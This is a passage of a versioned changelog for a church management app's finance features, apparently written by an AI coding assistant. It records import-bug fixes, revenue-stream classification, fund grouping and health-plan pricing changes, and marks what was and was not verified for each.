fourth revenue stream. Three consequences for this work, all carried in rather than merged around:
- `computeFlowDiagram` had the same segment-0 bug on the **expense** side, which would have
  collapsed all five board categories into one group named "Expenses". New `expenseGroupLabel()`,
  the expense-side twin of `revenueGroupLabel()`. A test injection confirms it bites.
- **The donor re-split was removed.** Splitting the donor node by the ChMS restricted ratio made
  sense when restricted was invisible in the GL; now that it is its own stream, doing both would
  draw the same restricted dollars twice and inflate total revenue.
- The Sankey gained the fourth stream (color ramp, label, authority note), and the mix bar,
  five-year chart and stream deltas now tolerate a missing stream key instead of throwing — a
  page the council reads should not blank because one key is absent.

`npm test` 937/937 (35 new here, plus main's). **Not verified**: a live browser — the standing caveat here. The
overlap guarantee is proven geometrically against the emitted SVG, which is stronger than eyeballing
one dataset, but it is not the same as seeing it rendered by a browser at a real font.
### v1.152.0 — Funds sharing a leading code combine into one line (2026-08-07)

**Asked for**: on the Church Report's "Giving by fund, per ChMS records" panel — and everywhere
else — combine funds that share a leading number, so "40085 Retirement Distribution" and
"40085 Lent" sit on the General Fund's line rather than scattered down the list as their own rows.

The rule already existed in two views (the Giving by Fund report and the board fund table, both
since G7/G22) as two hand-inlined copies, and did not exist at all in the three views that read
worst without it. It now lives in exactly one place — `groupRowsByFundCode()` in `js-core.js` —
and all five views call it, so they cannot print different fund lines for the same money.

- **Church Report → giving reference** (the reported view): was a flat list of every fund. Now one
  line per code, labeled with the code's highest-total fund ("40085 General Fund"), expanding in
  place to show its members. The CSV export follows the same shape, combined figure then indented
  members, so the download matches the screen.
- **Council narrative and the board print summary**: combined, with no member rows — there is no
  expansion on paper, and a council page has no reason to split the General Fund into its seasonal
  sub-names.
- **Giving by Fund report and the board fund table**: unchanged on screen; their inline copies of
  the rule were replaced by the shared one.

Two small behaviors were fixed by the consolidation rather than deliberately: the report's version
keyed every uncoded fund to the same empty-string group (harmless only because a later `key &&`
guard bailed out), and the board's keyed them by name (so two funds could never collide, but for a
different reason than the report). The shared helper gives each uncoded fund its own group, which
is what both views were reaching for.

Fund pickers, the giving entry tables and the reconcile-diagnose tool deliberately still list real
funds — data entry and forensics need the exact fund, not the family.

`npm test` (885/885, 10 new in `test/fund-code-grouping.test.js`, which runs the real helper and
the real renderers out of the built bundle); every new test verified non-vacuous by injecting the
exact regression it guards (bare-code labels, uncoded funds merged, the narrative back to a flat
list — 5, 1 and 1 correct failures). Plus `node --check` on both built bundles and a div-balance
scan of the assembled `CHMS_HTML`. **Not verified**: a live browser or real D1.
(`src/frontend/js-core.js`, `src/frontend/js-finance.js`, `src/frontend/js-giving.js`,
`src/frontend/js-reports.js`, `test/fund-code-grouping.test.js`,
`test/giving-consolidation-ui.test.js`)

### v1.151.5 — Half the importers never refreshed the import date (2026-08-07)

**Reported**: the Balance Sheet import runs and the preview looks right, but the date on Data &
Imports does not change.

**My own incomplete fix.** v1.151.2 made `finRenderDataImports()` always refetch and wired an
in-place `finRefreshImportStatus()` into the import success handlers — but only into the five that
happened to call `finRenderChurchReport()`, because that is what the sweep matched on. Ten
importers call `recordImport()`; five got the refresh. The Balance Sheet importer calls
`finLoadChurchBalances()` instead, so it was missed, along with four others.

Wired into all five that were missing it: `finChurchConfirmBalanceImport` (church_balance — the
reported one), `finDaycareChurchBudgetImport`, `finDaycareBulkImport`,
`finPropertyImportMonthlyCsv`, `finPropertyBudgetImportFileSelected`.

**The import itself was never affected** — `recordImport()` wrote its row correctly every time.
This is purely the card not re-reading it without a tab switch or reload.

New tests assert the wiring **by function body**, extracted from the built bundle, plus a count
check against `FINANCE_IMPORTERS.length` so a new importer that forgets the call fails here rather
than in production. `npm test` (875/875, 7 new); **verified non-vacuous** by removing the
balance-sheet call, which fails 2. Plus `node --check` on both bundles and div-balance on
`CHMS_HTML`. **Not verified**: a live browser.

### v1.151.4 — Balance Sheet importers: surface the real error too (2026-08-07)

**Reported**: "balance sheet isn't importing" — with no error text, so what follows is a
visibility fix and a request for detail, not a diagnosis. Nothing was found wrong with either
Balance Sheet importer by inspection: both routes return a specific 4xx on every expected failure
(no file, too large, unreadable workbook, no matching sheet, no "As of" date, malformed row), and
`finChurchBalanceImportFileSelected` reads exactly the shape its route returns — so this is not a
repeat of the v1.151.1 response-shape mismatch. Neither file is available in this session.

**Changed**: both `persistChurchBalancesImport` and `persistChurchBalancesMultiYearImport` calls
are now wrapped, returning the real database message plus the year scope that failed
(`Could not save 412 balance rows for FY2019-FY2026: <db message>`), exactly as v1.151.3 did for
the Monthly P&L commit. Unguarded, a database failure there reached the worker's top-level handler
and became an opaque "Internal server error", which is undiagnosable from a report.

`npm test` (868/868, 2 new). **Verified non-vacuous** by bypassing the multi-year try/catch, which
fails the matching test. **Not verified**: a live browser, real D1, or the actual file — the next
attempt will name its own cause.

### v1.151.3 — Monthly P&L import: surface the real error, not a bare 500 (2026-08-07)

**Reported**: "now Error: Internal server error. Please try again."

**Not a diagnosis — a visibility fix, and that is the honest description.** The worker's top-level
`/admin/api/` handler deliberately logs the exception server-side and returns an opaque
`Internal server error. Please try again.` That is the right default, but it means the only copy of
the actual message is in Cloudflare's logs, which are not reachable from here — so this report
could not be diagnosed at all, only guessed at.

**What was ruled out, by running the real route handlers against the real 2019-2026 file:** the
preview returns 200 with 8 years / 16,107 rows / a 3.89 MB payload; all 8 per-year commits succeed
(525 KB bodies, max 500 statements per `db.batch()`); `finance_import_log` gets its row; and
`finance/import-status` reads it back as `FY2019-FY2026`. So the failure is not reproducible with
that file, which points at either a different file (a reformatted one was mentioned) or a
real-D1 condition the SQLite harness cannot model — a quota, a batch limit, a constraint.

**Changed**: the commit route now wraps `persistChurchEntriesMonthlyImport` and returns the real
message plus the scope that failed (`Could not save 2124 rows for FY2019: <db message>`), and the
preview route gained an outer catch reporting `Could not read this Monthly P&L sheet: <message>`.
Every *expected* failure still returns its own specific 4xx as before; this only replaces the
opaque case. Both routes are finance-gated, so returning the underlying message is safe — the same
reasoning already recorded for the column-count error in `api-import.js`.

`npm test` (866/866, 4 new in `test/finance-monthly-import-errors.test.js`, driving the real route
handlers with a db whose `batch()` throws). **Verified non-vacuous** by removing the commit-route
try/catch, which fails 2 of them with the raw exception escaping. Plus the full real-file route
harness re-run unchanged. **Not verified**: a live browser, real D1, or the actual failing file —
the next attempt will now name its own cause.

### v1.151.2 — Data & Imports read "never" after a successful import (2026-08-07)

**Reported**: "I just uploaded a monthly P&L and upload still says never."

**The import was fine; the card was not.** `_finImportStatus` (`js-finance.js`) was fetched once
per page load behind an `if (!_finImportStatus)` guard and then never invalidated by anything. So
the sequence was: open Data & Imports (fetch, cache "never") → run an import (the commit route
writes its `finance_import_log` row correctly) → return to the tab → render from the cache →
still "never", until a full page reload. **This affected all ten importers**, not just the Monthly
P&L one, and dates back to FIN57 when the tab shipped.

Fixed by making the fetch unconditional — extracted as `finRefreshImportStatus()`, called on every
`finRenderDataImports()`. The cached value is still kept, but only so a revisit paints the previous
answer instantly instead of flashing empty; it is always replaced by a fresh one. Expecting each of
ten importers to remember to invalidate a shared cache is the fragile version of this, and none of
them did. Also wired `finRefreshImportStatus()` into the five file-import success handlers
(church budget, monthly P&L, activity multi-year, budget multi-year, balance multi-year) so the
card updates in place without leaving the tab. The QBO `sync-years` path is deliberately not
wired — it never writes an import-log row.

**Also fixed, latent, in v1.150.0's own code**: the monthly commit route built its log note with
`db.prepare(...).bind().first().catch(...)` — the only zero-argument `.bind()` in the codebase
(every other parameterless query calls `.first()` straight off `.prepare()`). A synchronous throw
there would escape the promise-tail `.catch()` and fail the route *after* the rows were already
written, leaving data imported and no log row — the exact symptom reported, by a second route.
Rewritten as a `try`/`catch` around a conventional parameterless query, falling back to the
request's own year range.

`npm test` (862/862, 2 new). The staleness test is **verified non-vacuous** by restoring the
`if (_finImportStatus)` guard, which fails it. Plus `node --check` on both built bundles and
div-balance on `CHMS_HTML`. **Not verified**: a live browser.

### v1.151.1 — Monthly P&L import threw on every upload: a missed call site (2026-08-07)

**Reported** from the live app, with a screenshot: choosing a file in Import Monthly P&L showed
`Error: Cannot read properties of undefined (reading 'length')` and no preview.

**Cause, and it is mine.** v1.150.0 changed the preview response from `{ fiscalYear, months }` to
`{ years, monthsByYear }` to carry many years. `finChurchRenderMonthlyImportPreview` and
`finChurchConfirmMonthlyImport` were both updated; the status line in
`finChurchMonthlyImportFileSelected` (`js-finance.js:3359`) was not, and still read
`d.months.length` — undefined on every response, so the handler threw before ever rendering the
preview. Fixed to read the multi-year shape, with the row/skipped reads guarded too.

**Why the v1.150.0 verification missed it.** That harness called the two changed functions
*directly* with a hand-built response object. It never went through the handler that actually
receives the fetch — so the one call site that was left on the old shape was the one place never
exercised. New `test/finance-monthly-import-ui.test.js` (4 tests) drives the real
`finChurchMonthlyImportFileSelected` out of the real built bundle with `fetch` stubbed, covering
multi-year, single-year, the preview/button reveal, and a server-error response. **Verified
non-vacuous** by reinstating the exact line: 3 of the 4 fail, and the multi-year assertion
reproduces the reported string verbatim (`Error: Cannot read properties of undefined (reading
'length')`).

`npm test` (860/860), `node --check` on both built bundles, div-balance on `CHMS_HTML`, and the
real 2019-2026 file re-run end to end unchanged (8 years, 16,107 rows). **Not verified**: a live
browser.

**Unrelated to the bug, worth recording**: the screenshot also showed the pre-v1.150.0 modal copy,
which means that page had been loaded before the deploy landed — an older page calling a newer
backend. The shell is `no-store`, so a reload picks up the new copy; nothing to fix.

### v1.151.0 — Compensation: single + family deductible / OOP columns, and they now drive the maths (2026-08-06)

Reported: the health plan rates table needed the deductible split into **single** and **family**
columns, and (follow-up) "the individual deductible… also changes the math, since you have to meet
individual separately."

**Columns.** The rates table now carries four figures per option instead of two: `Deductible —
single`, `Deductible — family`, `Out-of-pocket max — single`, `Out-of-pocket max — family`. The
single figures already existed in `HEALTH_PLAN_QUOTE_2027` (`deductibleIndividualCents` /
`oopMaxIndividualCents`) and were already used by the lone-claimant maths — they had simply never
been exposed, so they could not be corrected when a new quote arrived. Single out-of-pocket max is
included alongside the deductible because the two are read as a pair by
`finHealthPlanEffectiveLoneClaimantTermsCents`; exposing one without the other would let the table
go internally inconsistent. The plan cards now read "Deductible $4,000 single / $8,000 family".

**Real bug fixed — the edits did nothing.** `finHealthPlanEffectiveLoneClaimantTermsCents`,
`finComputeHealthPlanFamilyBreakevenCents` and the "what the family would actually pay" table all
read `HEALTH_PLAN_QUOTE_2027.options[...]` **directly**, bypassing the override map that the rates
table writes to. So editing a deductible changed the number printed on screen and nothing else —
the breakeven analysis silently kept using the shipped quote figures. New
`finHealthPlanResolvedOption(key)` resolves all four figures through `finCompPlanQuoteField`, and
every consumer goes through it. Without this the new single-deductible box would have been a
control that visibly did nothing, which is a failure mode this codebase has hit before.

**Verified:** `npm test` (856/856). Three new tests pin the wiring specifically — an edited single
deductible moves the lone-claimant terms, an edited family deductible moves the breakeven, an
edited single OOP max moves the single-claimant worst case. One of them initially passed
vacuously: overriding the *option's* family deductible left the breakeven unchanged, correctly,
because that plan is already saturated at its out-of-pocket max at that spend — retargeted at
Renewal, the plan actually still on the rising part of the curve. `test/finance-salary-calculator.js`'s
extraction harness needed the two new functions added to its list and an override map in scope.
Also `node --check` on both built bundles. **Not verified:** a live browser.

**Open question raised with the user, not yet resolved:** the follow-up said individual deductibles
must be met separately "in the non-embedded plans," which is the reverse of the standard definition
this code implements (embedded = an individual sub-limit exists inside the family deductible;
non-embedded/aggregate = no sub-limit, so a lone claimant must clear the whole family figure).
Flipping it would change shipped, hand-reconciled figures — e.g. "Option A ties Renewal in the
single-claimant worst case" — so it was not changed on a guess. See CLAUDE.md FIN54.


### v1.150.0 — Monthly P&L import: read style indentation, accept many years in one file (2026-08-07)

**Asked**: can one Monthly P&L upload carry several years of months? Answered against a real
uploaded file (`Statement of Activity`, Jan 2019 – Jul 2026, 91 month columns, 177 accounts) rather
than from the code alone — and running it through the shipped parser showed the honest answer was
worse than "no": **0 rows parsed, 178 skipped, no error**. A successful-looking import of nothing.

**Two independent bugs, both fixed.**

1. **Depth detection couldn't read this export at all.** `parseMonthlyPnLGrid` measured hierarchy
   with `indentDepthOf()` (leading spaces only). This file has **zero** leading spaces — the
   hierarchy is entirely in the workbook's cell-style indent metadata (`alignment indent="2"`),
   which `parseXlsxAllSheets` already surfaces as `sheet.colAIndent` and was simply never passed in.
   Every row therefore read as depth 0 with no children and hit the
   `depth === 0 && !hasChildren` guard. This is the same bug and the same fix as FIN36 applied to
   `parseActivityMultiYearGrid`: now uses `balanceRowDepth()`/`nextNonBlankRowIndex()`, which try
   leading spaces first, so the older exports that *do* indent with spaces are unaffected.
2. **Multi-year files collapsed into one year.** The parser took `fiscalYear = monthCols[0].year`
   and `persistChurchEntriesMonthlyImport` bound that single year to *every* row, ignoring the
   `fiscal_year` each row already carried. With the unique key
   `(fiscal_year, period_month, category_path, source)`, each successive year's January overwrote
   the last through the `ON CONFLICT DO UPDATE` — eight years silently becoming one. Rows now store
   under their own year, and the DELETE is scoped to exactly the years present.

**Shape changes.** `parseMonthlyPnLGrid(grid, colAIndent)` returns `{ years, monthsByYear, rows,
skipped }` (was `{ fiscalYear, months, ... }`). `persistChurchEntriesMonthlyImport(db, rows,
importedAt)` drops its `fiscalYear` argument. The commit route no longer takes a top-level
`fiscal_year`; it validates each row's own and derives the year set. Inserts are flushed in chunks
of 500 — a full multi-year file is ~16,000 statements, far past what one D1 batch should carry.
The preview route now returns a real error instead of an empty success when nothing parses.

**UI.** The preview leads with a coverage summary (`8 years · Jan 2019 to Jul 2026 · 177 accounts ·
16,107 rows`) and a per-year table naming which months each year actually contains — 2026 shows
`Jan, Feb, Mar, Apr, May, Jun, Jul`, not a silent partial. The detail table shows one column per
month for a single-year file (unchanged) and one column per year, holding that year's total, for a
multi-year one; 91 month columns is not a table anyone can check by eye. Commit sends **one request
per year, sequentially**, so each request is the size of the single-year import that was already
proven, progress is visible, and a failure part-way names which years landed rather than implying
the whole file failed (nothing is rolled back).

**Verified.** `npm test` (853/853, 4 new); both new tests checked for vacuity by reintroducing the
exact bug each guards — reverting depth detection failed 3 tests, reverting the year binding failed
1. Against the real file end to end: 8 years / 16,107 rows / 12-12-12-12-12-12-12-7 months, and
**every one of 4,702 non-empty account cells reconciles to the source workbook to the cent** (the
364 unmatched are the four running-subtotal labels — Gross Profit, Net Revenue, Net Operating
Revenue, Net Other Revenue — which are deliberately never stored and always re-derived). 2019
Sunday Offering: $422,944.17 in both. Re-importing one year leaves the other seven intact. Plus
`node --check` on both built bundles, div-balance on the assembled `CHMS_HTML`, and a `vm` harness
running the real shipped `finChurchRenderMonthlyImportPreview`/`finChurchConfirmMonthlyImport` out
of the built bundle across both the single-year and multi-year paths (8 requests, one year each,
2124/2124/2124/2124/2124/2124/2124/1239 rows). **Not verified**: a live browser or real D1.

### v1.149.1 — Remove the vestigial "Sales" special-casing (2026-08-07)

Asked where "Sales" came from, since this church has no such account. Traced to **FIN14
(2026-07-20, v1.45.0)**: a requested presentation reorganization of the Church Report added
`finRemoveNodesByLabel(cloned, /^sales$/i)`, hiding any account named exactly "Sales" from the
account tree — while the server-computed Total Revenue stat card kept counting it, recorded at the
time as a known limitation rather than silently fixed. Every later mention descends from that one
rule, including the illustrative fixture v1.149.0 added to `test/finance-church-tree.test.js` the
day before, which is what made it suddenly look widespread.

With the account confirmed not to exist, the special-casing is dead weight that only creates
confusion — and if one ever did appear in an old imported year, hiding it while its dollars counted
in the total is precisely the inconsistency worth not having. Removed: the hide rule, the
now-unused `finRemoveNodesByLabel()` helper (no other call sites), and `sales` from the earned
`REVENUE_STREAM_RULES` regex (functionally a no-op — an unmatched group already defaults to
`earned` and is reported as guessed either way — so this is purely removing a misleading mention).
The stale FIN14 comment block is rewritten to say the tree now hides nothing and therefore cannot
disagree with the Total Revenue card.

`npm test` (849/849). The test that pinned the removed behavior was replaced with its inverse —
that no account is hidden and every one reaches the rollup — and **verified non-vacuous** by
re-adding the hide rule, which fails it (5 fail). Plus `node --check` on `api-finance.js` and both
built bundles, and the render harness re-run. **Not verified**: a live browser.

### v1.149.0 — Revenue mix read 100% earned: the group key was the classification (2026-08-07)

**Reported**: the Financial Health page's revenue mix bar showed `EARNED $621,462 · 100%` with
`$0` donor and `$0` passive, above a banner reading "1 account group was classified by name and
never confirmed (Income)" — and a donor card simultaneously reporting `$0` and `129 giving
households`. Two follow-ups in the same conversation: a way to classify QuickBooks' own account
groups once and have it stick month to month, and why every importer on Data & Imports read
`never`.

**Root cause — one line.** `computeRevenueStreams()` took the account group as
`category_path.split(':')[0]`. But every parser in `api-finance.js` puts the CLASSIFICATION in
segment 0 (`path = [classification]` at depth 0 — `parseBudgetVsActualsGrid:630`,
`parseIncomeStatementMultiYearGrid:812`, `flattenReportTree:519`), so the group a human can
actually classify is segment 1. Every revenue row therefore collapsed into one group literally
named `Income`, which matched none of the `REVENUE_STREAM_RULES` regexes and fell to the
deliberate `earned` default — putting the entire budget in one stream. The test fixtures used
paths like `'40 Offerings:41 Plate'`, a shape no importer in this repo produces, which is why the
suite passed while real data failed. New `revenueGroupLabel()` skips a leading classification
segment (`Income`/`Other Income`/`Revenue`/`Other Revenue`), and the fixtures now carry the prefix
exactly as written.

**Restricted is now a fourth stream** (user decision, chosen over keeping three): Donor · Earned ·
Passive · Restricted, matching the four categories `funds.category` already uses on the Giving tab
(migration 0033), so the two sides of the app finally agree. Rule order is precedence order,
restricted first; `\brestricted\b` carries word boundaries so it cannot match "Unrestricted", and
`altar guild`/`designated` moved off the donor rule — a designated gift arrives from a donor but
is not money the board can redirect. UI: a fourth mix-bar segment and control band, a fourth
stream card (`Spoken for`, new `.fin-chip-neutral` — navy on blue-mist, since teal at that chip's
0.74rem bold lands near 3.8:1), a fourth flow ribbon, and a new `.fin-stream-grid` (four columns,
collapsing on the existing 1100/767 tiers only — no new breakpoint, per MOB3). A stream with no
money now renders no segment at all, which was previously impossible and would otherwise leave a
stray 3px control-band tick under the bar.

**One mapping drives both pages** (user decision). The saved classification
(`chms_config.finance_revenue_streams`, edited on Data & Imports → Classification & policy) always
persisted and was always re-read on every import — it was only ever useless because the editor had
exactly one row in it to map. `computeRevenueStreams()` now also returns `map` (every group's
resolved stream, override or guess), and `finReorganizeChurchTree()` groups the Church Report's
own account tree from that same map instead of its hardcoded
`/^(facility rental|fundraisers|mdo)$/` + `/^altar guild$/` regexes. It falls back to the original
regexes verbatim when no map is loaded, so the four existing tests that pin that behavior still
pass unchanged. **This also removes a stated inconsistency (FIN14)**: the old path deleted "Sales"
from the tree while its dollars still counted in the server-computed Total Revenue. With every
group classifiable there is no reason to hide it, so the tree and the total now agree.

**Import dates read `never` because nothing backfills the log.** `finance_import_log`
(migration `0034`) shipped with the Data & Imports tab the day before and only gets a row from
`recordImport()` on a successful run — so every importer that last ran before that reads `never`
even though its rows are still in `finance_church_entries` / `finance_church_balances` /
`finance_property_monthly` / `finance_daycare_entries` and still driving every report. **No
re-import is needed.** New `deriveImportDates()` reads a best-effort date off the imported rows'
own `synced_at`/`updated_at`/`created_at`, used only for an importer with no real log row and
marked `from the data` in the UI so it is never read as a logged run. Two pairs genuinely share
one timestamp and say so (Statement of Activity + Budget by Year both write
`source='import_activity'`; both Balance Sheet importers write `source='import'`), and
`daycare_bulk` is deliberately left as `never` — it inserts with the default `source='manual'`,
identical to a row typed into the one-at-a-time form, so any date there would be a guess.

**Verification.** `npm test` (849/849, 22 new across `test/finance-health.test.js` and
`test/finance-church-tree.test.js`). **Every new test verified non-vacuous** by injecting the exact
regression it guards — reverting the group label to `split(':')[0]` (10 fail), dropping the
restricted rule (2), putting zero-money groups back into `unmapped` (1), and ignoring the stream
map (3). Plus `node --check` on `api-finance.js` and both built bundles; a `vm` harness running
`finRenderRevenueMix`/`finRenderStreamCards`/`finRenderFlow`/`finRenderImportRow` out of the real
built bundle across four streams, an empty restricted stream, and zero revenue, with div-balance
asserted on each; and all seven derived-import queries executed against the real schema in
in-memory SQLite, confirming each returns the right `MAX` and that a `qbo_sync` row is never
mistaken for a file import. The test harness in `finance-church-tree.test.js` needed
`FIN_STREAM_GROUP_LABELS` added to its extracted vars, and `finReorganizeChurchTree` uses a
`typeof` guard on `_finStreamMap` so it stays runnable from an isolated extract (FIN46 convention).
**Not verified**: a live browser or real D1.

**One thing to do after this deploys**: open Data & Imports → Classification & policy → *Review
revenue-stream classification*. It will now list the real account groups with a dropdown each.
Anything still marked `guessed` is the app's own name-matching, not a confirmed answer — and the
Financial Health page is only as honest as that table.

### 2026-08-07 — TinyMCE "50% of Editor Load limit" notice: traced, and it is not this app

Investigation only — **no code change in this repo**, because there is nothing here to change.
A Tiny (TinyMCE) automated email warned the account had reached 50% of its monthly Editor Load
limit, with overage charges beyond it. The obvious suspect was Connect's giving-letter template
editor (`initLetterEditor()`, `src/frontend/js-settings.js`). It is not.

**Connect contributes zero cloud editor loads, and always has.** Since v1.64.0 (2026-07-23) this
app has self-hosted TinyMCE 7 under GPL: the script is fetched same-origin from
`/admin/vendor/tinymce/tinymce.min.js` (Worker route at `tlc-volunteer-worker.js:243`, proxying
`vendor/tinymce/` out of this repo), `base_url` points at that same path, and
`license_key: 'gpl'` is set. Verified rather than assumed — a repo-wide scan for `tiny.cloud`
outside `vendor/` returns exactly two hits, both prose (this file and the Worker's own comment
explaining the self-hosting), and the only `tiny.cloud` strings inside the vendored bundle itself
are documentation URLs baked into warning messages (`/docs/tinymce/7/migration-from-6x/`,
`/support/#supportedwebbrowsers`, `/license-key/`), not a telemetry or metering endpoint. There is
no API key anywhere in this repo, and the CSP (`script-src 'self' 'unsafe-inline'`, `src/auth.js`)
would block a cloud load even if one were added by accident.

**The loads come from the website repo** (`timothystl/website` → `tlc-newsletter-admin` Worker,
admin.timothystl.org). `admin/db.js:6` builds a `TINYMCE_HEAD` `<script>` pointing at
`https://cdn.tiny.cloud/1/<api key>/tinymce/7/tinymce.min.js`, and its CSP allowlists
`cdn.tiny.cloud` accordingly. That head block is injected on the editor screens only (sermons,
newsletters, news posts, ministry pages/posts, notices, the ministry editor, gym) — not on every
admin page — so the count is driven by *how many editors each of those screens builds*, not by
general admin traffic. `tinymceField()` (`admin/helpers.js:940`) emits its own `tinymce.init()`
per rich-text field, and the newsletter screens (New Newsletter / Edit Newsletter) instantiate six
before any extra notes: pastor, secondary, Word of Life, LASM, tertiary, quick — plus one more per
extra note. So a single open of the newsletter editor is on the order of seven editor
initializations, and every reload or failed save repeats them.

**Fix, if it is wanted, is in that repo, not this one**: do there what was already done here —
vendor the needed TinyMCE subset and serve it same-origin off its own Worker. The pattern is
proven on this exact infrastructure by v1.64.0 and needs no API key and no paid tier (TinyMCE 7 is
GPL v2+ for self-hosting). One difference to plan for: the website's toolbar asks for
`image link lists blockquote table code`, and `vendor/tinymce/plugins/` here carries only
`code/image/link/lists` — a vendored subset over there additionally needs `table` (`blockquote` is
a core format, not a plugin file, so it needs nothing extra). Cheaper partial mitigation, if a
full self-host is not wanted immediately: lazy-init each editor on first focus so opening a
newsletter costs one load instead of seven.

**Also worth an admin's attention, though not itself a bug**: the key at `admin/db.js:5` is
hardcoded in what is a *public* repository. A Tiny cloud key is inherently public (it ships in
client-side HTML on every editor page, so anyone viewing source already has it) — the protection
is Tiny's own approved-domains list, not secrecy. Worth confirming in the Tiny account that the
approved-domains list is restricted to admin.timothystl.org, so the quota being consumed can only
be this church's own usage.

### v1.148.0 — Finance Workspace v3: the tab answers "how are we doing?" (2026-08-06)

Implemented the `design_handoff_finance_workspace` bundle ("Finance overview framing"). The tab
previously answered *what do the ledgers say*; the board's question is *how are we doing, and what
should we decide*. Six screens changed; **Compensation was explicitly out of scope and is byte-for-
byte untouched** (verified: its panel markup is identical and all 126 `finComp*`/salary/Concordia/
health-plan functions are unchanged strings).

**Navigation.** `FIN_TOPNAV_ITEMS` becomes Financial Health · Church Report · Daycare Report ·
Commercial Property · Planning · Compensation │ Data & Imports. `_finActiveNavId` defaults to
`health`; a stale `finSection` of `overview` redirects to `health` so an old bookmark or history
entry can't land on a section no panel answers to.

**Screen 1 — Financial Health (new, replaces Overview).** Reads the money a second way: by *who
controls it*. A revenue-mix bar with a control band underneath ("We set the ask" / "Reported to us"
/ "Timing only"), three stream cards, a flow diagram whose ribbon thickness is recomputed from real
figures every render, three entity cards stating what the board decides about each, giving-vs-budget
pace, a cash runway against an admin-set policy floor, five years of the mix, an appeal card with a
scope toggle and an ask ladder, three lever cards, and a decisions card.

**Screen 2 — Church Report.** Mode pills instead of three buttons; **the seven import buttons are
gone from the toolbar** (the functions are untouched and now run from Data & Imports). Three summary
cards whose variance arithmetic reconciles (net variance = actual net − budgeted net). Revenue
sources as labeled bars rather than a pie. The expense panel is sorted by variance and cut to five,
keeping the click-to-drill behavior. **Five-year net income is a new zero-baseline chart** —
`renderGroupedBarChart()` draws a deficit year as an invisible sliver (its own comments say so), and
that is the year a board needs to see.

**Screen 3 — Daycare Report.** Navy wages÷billed ratio strip, then room-level occupancy and
per-room margin. **The room data does not exist yet** — the daycare app publishes no per-room
endpoint (see `DAYCARE_API.md` in the bundle) — so the page degrades to the category-by-year table
and says plainly what is missing, rather than erroring or drifting into a blanket "we are full".
The ChMS half is built: `finance_daycare_rooms`, `GET /finance/daycare/rooms`, `POST
/finance/daycare/rooms/sync`, and `daycareRoomsConfigured()`/`client.rooms()` behind a new
`DAYCARE_ROOMS_API_URL` secret.

**Screen 4 — Commercial Property.** Navy "available to distribute today" hero (AHRA's own cash-minus-
reserves figure) beside a four-line "does it fund itself?" P&L; charts row; three collapsed ledger
strips. Every bulk admin control (budget xlsx import, CSV paste, +Add Month, base-minimum and
reserve editing, the valuation calculator) moved to Data & Imports — row-level Edit/Delete stay in
the expanded tables. The property page now contains no file input at all.

**Screen 5 — Planning.** Year inputs moved into the header beside the title they qualify. New navy
summary strip ending in **Revenue needed to balance**, the connective tissue between Planning and
the Health page. The three-year grouped-bar outlook became the handoff's five-year line chart:
expenses compounding at 3% against revenue held flat, with the gap filled between them. The Ivanhoe
forecast leads with four tiles (three years plus the payoff year) and keeps its table behind a
disclosure.

**Screen 6 — Data & Imports (new).** Three status cards, a file-imports card grouped by what each
feeds **with the last-import date per importer** — the point of the tab, staleness visible without
opening a report — one unified hand-entered-adjustments form with a What selector swapping field
sets, the danger zone, the property data-entry tools, and the raw QuickBooks dumps behind
disclosures.

**New server work.** Revenue-stream classification (`computeRevenueStreams`, config-driven via
`chms_config.finance_revenue_streams`, admin-editable, **defaulting an unrecognized group to
`earned` rather than `donor`** — overstating donor revenue would overstate how much of the budget
the board can actually influence, which is the one claim the page exists to make honestly, and every
guessed group is returned in `unmapped` and surfaced on-page). Restricted/unrestricted donor split
reusing `funds.category` (migration 0033) rather than a new flag. `computeMoneyFlow` (MDO vs.
everything else, always summing to total expenses). `computeCashRunway` + `operatingCashFromAccounts`
+ an admin `finance/cash-policy`. `computeRoomOccupancy`. `finance_import_log` + `recordImport()`
stamped by all ten importers + `GET /finance/import-status`. `streamsByYear` on the multi-year
payload and `givingMonthly`/`donorBands` on this-year.

**Two deliberate deviations from the handoff**, both to avoid a near-enough number:
- The giving-bands panel reads **annual** household bands computed alongside the other Health
  queries, not `reports/giving-bands`, which buckets by weekly/monthly *pace* — translating a
  per-week band into "$2,000+ a year" would be an approximation sitting next to an exact ask ladder.
  The card's "Open giving bands →" still opens that report.
- Church Report keeps the year-over-year block, the giving-by-fund table and the supplies chart as
  additional collapsed strips. The handoff never asked for them to be deleted, and dropping working
  features to match a block list would have been a silent loss.

**Verified.** `npm test` (834/834; 28 new in `test/finance-health.test.js`, and
`test/finance-planning-outlook.test.js` rewritten against the new chart's contract). **Every new
test checked for vacuity** by injecting the exact regression it guards — default-stream flipped to
donor, Other Expenses dropped from the flow split, the runway's zero-expense guard removed, the ask
ladder restating the raw target, and the seasonal room counted into the seat basis — all five failed
the right test and only the right test. Plus `node --check` on `api-finance.js` and both built
bundles; a `vm` harness running all eighteen render paths (including every degraded state: no
property, no cash, no giving, no rooms, no entries) against realistic fixtures, with tag-balance
checks on all seven rendered views, a check that the appeal ladder's stated total equals the sum of
its own rows, and confirmation that all 39 inline handlers the views emit resolve to real functions;
a whole-document div-balance scan of the assembled `CHMS_HTML` confirming `#tab-finance` and all
seven panels sit inside `.content-area` (the TAP2-BUG class); and `test/breakpoints.test.js` holding
the stylesheet to its three tiers. Caught and fixed one instance of this project's own
backtick-in-a-comment-breaks-`String.raw` bug class (SC3-BUG1/FIN15) before it shipped — found by
importing the module, not by reading the diff.

**Not verified**: a live browser, a real print dialog, or a live D1 — the standing caveat on all
frontend work here. Two things need an admin outside this repo: `DAYCARE_ROOMS_API_URL` set as a
Worker secret once the daycare app publishes that endpoint, and a first pass through **Data &
Imports → Classification & policy** to confirm the revenue-stream mapping and the reserve policy
floor, since the Health page's headline claim rests on both.

### v1.147.0 — Health plan priced by coverage tier, as Concordia publishes it (2026-08-06)

Asked to take the renewal packet's own entry page: a **monthly** premium per coverage tier — Self /
Self & Spouse / Self & Child / Family — with the tier set per worker.

Before this the card took one ANNUAL group medical figure per plan option and split it evenly across
a hand-typed "Family contracts" count. That was only ever right because this church happens to have
two Family contracts and nothing else; the moment one worker sits on Self, an even split charges
them a Family share. It also meant the packet had to be re-arithmeticked by hand before it could be
typed in.

Now: `tiersMonthlyCents` per option (the packet's Enrollment and Rates block verbatim),
`finHealthTierMonthlyCents()`, and a worker's cost is their own tier's rate x 12 plus an even share
of dental and vision — which the packet does not tier-price, so there is no per-worker figure to
read for those. Enrollment counts are read off the roster (`finCompEnrollmentCounts()`), not typed:
they are the same thing as the packet's count column, and asking for them twice is how the two
quietly stop agreeing. The hand-typed contracts box, `finCompContractCount()` and
`finHealthPlanPerContractCents()` are deleted, and `healthPlanContracts` no longer loads from the
